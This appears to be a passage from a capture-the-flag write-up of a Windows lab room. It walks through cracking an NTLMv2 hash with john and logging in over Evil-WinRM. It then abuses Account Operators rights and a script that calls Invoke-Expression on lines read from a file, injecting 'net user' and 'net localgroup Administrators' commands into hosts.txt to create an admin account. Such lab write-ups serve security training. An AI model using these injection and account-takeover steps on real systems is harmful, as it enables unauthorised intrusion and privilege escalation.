## Cracking NTLM hash

We captured the NTLM hash of `buse` ! Now, let's try to crack it using [john](https://www.openwall.com/john/doc/) :  
```
attacker@AttackBox:~/Ra$ nano hash.txt 
attacker@AttackBox:~/Ra$ /opt/john/run/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
**********      (buse)     
1g 0:00:00:02 DONE (2023-01-28 05:17) 0.3412g/s 1010Kp/s 1010Kc/s 1010KC/s v#glbm7+..uya+kyo9049578
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Now we have the password for user `buse` !

## Getting a shell

Remember, port 5985 for WinRM (Windows Remote Management) is open. We can try to use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to connect to this service using the credentials we have :  
```
attacker@AttackBox:~/Ra$ evil-winrm -i 10.10.11.49 -u buse -p **********

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\buse\Documents>
```

We can get the second flag in buse's desktop :  
```
*Evil-WinRM* PS C:\Users\buse> cd Desktop
*Evil-WinRM* PS C:\Users\buse\Desktop> ls


    Directory: C:\Users\buse\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/7/2020   3:00 AM                Also stuff
d-----         5/7/2020   2:58 AM                Stuff
-a----         5/2/2020  11:53 AM             45 Flag 2.txt
-a----         5/1/2020   8:33 AM             37 Notes.txt


*Evil-WinRM* PS C:\Users\buse\Desktop> cat "Flag 2.txt"
THM{****************************************}
```

## Privilege escalation

Let's see what privileges we have :  
```
*Evil-WinRM* PS C:\Users\buse\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Nothing special... Let's see what groups we are member of :  
```
*Evil-WinRM* PS C:\Users\buse\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

We are part of `Account Operators` group. We may be able to edit passwords of other users. If we take a look at `C:\`, we can find an uncommon directory :  
```
*Evil-WinRM* PS C:\Users\buse\Desktop> cd C:\
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/2/2020   6:33 AM                inetpub
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---         5/8/2020   7:43 AM                Program Files
d-----         5/7/2020   2:51 AM                Program Files (x86)
d-----         5/3/2020   5:48 AM                scripts
d-----        5/29/2020   5:45 PM                Shared
d-r---         5/2/2020   3:05 PM                Users
d-----        5/30/2020   7:00 AM                Windows
```

There is a `scripts` directory. Let's see what's inside :  
```
*Evil-WinRM* PS C:\> cd scripts
*Evil-WinRM* PS C:\scripts> ls


    Directory: C:\scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/3/2020   5:53 AM           4119 checkservers.ps1
-a----        1/27/2023   8:39 PM             31 log.txt
```

There is a powershell script. Let's see what this script is used for :  
```
*Evil-WinRM* PS C:\scripts> cat checkservers.ps1
# reset the lists of hosts prior to looping
$OutageHosts = $Null
# specify the time you want email notifications resent for hosts that are down
$EmailTimeOut = 30
# specify the time you want to cycle through your host lists.
$SleepTimeOut = 45
# specify the maximum hosts that can be down before the script is aborted
$MaxOutageCount = 10
# specify who gets notified
$notificationto = "brittanycr@windcorp.thm"
# specify where the notifications come from
$notificationfrom = "admin@windcorp.thm"
# specify the SMTP server
$smtpserver = "relay.windcorp.thm"

# start looping here
Do{
$available = $Null
$notavailable = $Null
Write-Host (Get-Date)

# Read the File with the Hosts every cycle, this way to can add/remove hosts
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
ForEach-Object {
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p
if($p)
    {
     # if the Host is available then just write it to the screen
     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White
     [Array]$available += $_
...
...
...
```

This script is reading `C:\Users\brittanycr\Desktop\hosts.txt` file, and uses Invoke-Expression for every lines. We can inject commands in this file to create a new admin user. Since 
we can change the password of user `brittanycr`, we may be able to edit the `hosts.txt` file on the desktop. So first, let's change the password for this user :  
```
*Evil-WinRM* PS C:\scripts> net user brittanycr Password123! 
The command completed successfully.
```

We can't use those credentials for WinRM or RDP, but we can use them on the SMB service and connect to the `Users` share :  
```
attacker@AttackBox:~/Ra$ smbclient //windcorp.thm/Users -U brittanycr
Enter WORKGROUP\brittanycr's password: 
Try "help" to get a list of possible commands.
smb: \> cd brittanycr\
smb: \brittanycr\> ls
  .                                   D        0  Sun May  3 01:36:46 2020
  ..                                  D        0  Sun May  3 01:36:46 2020
  hosts.txt                           A       22  Sun May  3 15:44:57 2020

		15587583 blocks of size 4096. 10906327 blocks available
smb: \brittanycr\>
```

Let's create a malicious `hosts.txt` file :  
```
attacker@AttackBox:~/Ra$ nano hosts.txt
attacker@AttackBox:~/Ra$ cat hosts.txt 
;net user Cyberretta Password123! /add;
;net localgroup Administrators Cyberretta /add;
```

Now, let's upload this file to the target using SMB :  
```
smb: \brittanycr\> put hosts.txt 
putting file hosts.txt as \brittanycr\hosts.txt (0,8 kb/s) (average 0,8 kb/s)
```

Now, we can connect to the target using RDP with the new administrator user we just created :  
```
attacker@AttackBox:~/Ra$ xfreerdp /v:windcorp.thm /u:Cyberretta /p:Password123!
[06:04:02:893] [4365:4366] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[06:04:02:894] [4365:4366] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[06:04:02:895] [4365:4366] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[06:04:02:895] [4365:4366] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[06:04:02:901] [4365:4366] [INFO][com.freerdp.client.x11] - Property 251 does not exist
...
...
...
...
```

![](https://i.imgur.com/5hgBXxu.jpg)  

We are now connected to the host with administrators privileges ! We can now get the last  
flag in `C:\Users\Administrators\Desktop\Flag3.txt` :  
![](https://i.imgur.com/RYrBuCJ.jpg)  

## Conclusion

In this room, we practiced :  
- Ports/services enumeration using [nmap](https://nmap.org/book/man.html)
- Website enumeration
- SMB enumeration
- Exploiting a vulnerability in Spark 2.8.3
- Hash cracking using [john](https://www.openwall.com/john/doc/)
- Windows privilege escalation

Thanks for this room ! And thanks for reading my write ups !
